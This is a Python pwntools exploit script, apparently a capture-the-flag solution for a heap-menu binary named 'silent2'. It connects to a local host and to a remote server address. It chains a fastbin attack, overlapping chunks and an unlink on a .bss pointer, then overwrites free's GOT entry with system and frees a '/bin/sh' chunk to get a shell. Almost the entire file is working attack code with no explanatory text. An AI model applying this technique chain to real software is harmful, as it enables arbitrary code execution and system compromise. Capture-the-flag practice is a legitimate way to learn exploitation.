#coding:utf-8
from pwn import *

context.arch = "amd64"

elf = ELF("./silent2")
LOCAL = True
if LOCAL:
    #context.log_level = "debug"
    io = remote("10.211.55.9", 22334)
else:
    io = remote("39.107.32.132", "10000")

def mnew(l, con):
    io.sendline("1")
    sleep(0.2)
    io.sendline(str(l))
    sleep(0.2)
    io.send(con)

def mfree(idx):
    io.sendline("2")
    sleep(0.2)
    io.sendline(str(idx))

def mchange(idx,con1,con2):
    io.sendline("3")
    io.clean()
    sleep(0.5)
    io.sendline(str(idx))
    io.clean()
    sleep(0.5)
    io.send(con1)
    io.clean()
    sleep(0.5)
    io.send(con2)
    io.clean()
    sleep(0.5)

bss_addr = 0x6020D8

padding = "/bin/sh\x00"
padding = padding.ljust(0xF8, 'm')
padding += p64(0x21)
padding += chr(0)*7
mnew(0x108, padding)
sleep(0.2)
mnew(0x10, 'a'*0xF)
sleep(0.2)
mnew(0x10, 'a'*0xF)
sleep(0.2)
mnew(0xF8, 'b'*0xF7)
sleep(0.2)
mnew(0xF8, 'b'*0xF7)
sleep(0.2)
padding = "/bin/sh\x00"
padding = padding.ljust(0x7F, '5')
mnew(0x80, padding)
sleep(0.2)
# fastbin attack
mfree(2)
sleep(0.2)
mfree(1)
sleep(0.2)
mchange(1, chr(0), 'm'*0x2F)
sleep(0.8)
mnew(0x10, 'a'*0xF) # 6
sleep(0.2)
# overlap
mnew(0x10, 'c'*0x8+p64(0x241)[:-1]) # 7
sleep(0.2)
mfree(1)
sleep(0.2)
# unlink
fake_dbchunk = '1'*0x18 + p64(0x21) + '2'*0x18 + p64(0x101)
fake_dbchunk += p64(0) + p64(0xF1)
fake_dbchunk += p64(bss_addr-0x18) + p64(bss_addr-0x10)
fake_dbchunk += '3'*0xD0 + p64(0xF0) + p64(0x100)
fake_dbchunk = fake_dbchunk.ljust(0x237, '4')
mnew(0x238, fake_dbchunk)
mfree(4)
# getshell
mchange(3, p64(elf.got["free"])[:4], 'v'*0x2F)
mchange(0, p64(elf.plt["system"])[:6], 'd'*0x2F)
mfree(5)
io.interactive()


